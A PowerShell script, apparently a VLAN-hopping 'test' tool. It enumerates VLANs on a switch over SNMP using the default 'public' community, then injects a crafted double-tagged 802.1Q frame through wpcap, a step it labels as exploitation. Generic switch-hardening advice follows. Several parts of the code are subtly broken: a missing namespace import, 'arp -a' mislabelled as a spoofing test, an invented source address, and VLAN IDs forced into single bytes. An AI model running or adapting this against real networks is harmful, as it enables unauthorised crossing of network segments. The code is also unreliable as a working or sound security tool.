# Requires RSAT's SNMP run .\vlan_hopping_windows_snmp.ps1

Write-Host "Running VLAN hopping test on Windows..."

# Detect VLAN IDs
Write-Host "Detecting VLAN IDs..."
$SNMPCommunity = "public"
$SwitchIP = "192.168.10.1"  # Replace with your switch IP
$vlanOIDs = @()
$vlanIDBaseOID = "1.3.6.1.2.1.17.7.1.4.3.1.1"

# Use snmpwalk to get VLAN IDs
$vlanIDs = snmpwalk -v 2c -c $SNMPCommunity $SwitchIP $vlanIDBaseOID
if ($vlanIDs.Count -lt 2) {
    Write-Host "Insufficient VLANs detected for testing."
    exit
}

$vlanID1 = [int]$vlanIDs[0].Split('=')[1].Trim()
$vlanID2 = [int]$vlanIDs[1].Split('=')[1].Trim()

# Switch Spoofing Test
Write-Host "Switch Spoofing Test:"
arp -a

# Double Tagging Test
Write-Host "Double Tagging Test:"
Test-Connection -Source "192.168.$vlanID1.1" -Count 4

# Example Exploitation (with permission)
Write-Host "Exploitation Example:"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class PInvoke {
    [DllImport("wpcap.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern IntPtr pcap_open_live(string dev, int snaplen, int promisc, int to_ms, StringBuilder errbuf);
    [DllImport("wpcap.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int pcap_sendpacket(IntPtr p, byte[] packet, int size);
}
"@
$packet = [byte[]]@(0x00,0x11,0x22,0x33,0x44,0x55,0x00,0x11,0x22,0x33,0x44,0x55,0x81,0x00,0x00,$vlanID1,0x81,0x00,0x00,$vlanID2,0x08,0x00,0x45,0x00,0x00,0x1c,0x00,0x01,0x00,0x00,0x40,0x01,0xf7,0xbc,0xc0,0xa8,$vlanID1,0x01,0xc0,0xa8,$vlanID2,0x02,0x08,0x00,0x4d,0x22,0x00,0x01,0x00,0x01)
$errbuf = New-Object System.Text.StringBuilder
$handle = [PInvoke]::pcap_open_live("Ethernet0", 65536, 1, 1000, $errbuf)
[PInvoke]::pcap_sendpacket($handle, $packet, $packet.Length)
Write-Host "Exploitation packet sent"

# SNMP Information Gathering
Write-Host "SNMP Information Gathering:"
$oids = @(
    "1.3.6.1.2.1.1.1.0",  # sysDescr
    "1.3.6.1.2.1.1.2.0",  # sysObjectID
    "1.3.6.1.2.1.1.5.0"   # sysName
)
$results = @{}
foreach ($oid in $oids) {
    $result = snmpget -v 2c -c $SNMPCommunity $SwitchIP $oid
    $results[$oid] = $result
    Write-Host $result
}

# Recommend actions based on detected switch type
if ($results["1.3.6.1.2.1.1.2.0"] -like "*Cisco*") {
    Write-Host "Recommended Action: Review Cisco switch configuration and ensure proper VLAN isolation."
} elseif ($results["1.3.6.1.2.1.1.2.0"] -like "*Juniper*") {
    Write-Host "Recommended Action: Review Juniper switch configuration and ensure proper VLAN isolation."
} else {
    Write-Host "Recommended Action: Review switch configuration and ensure proper VLAN isolation."
}

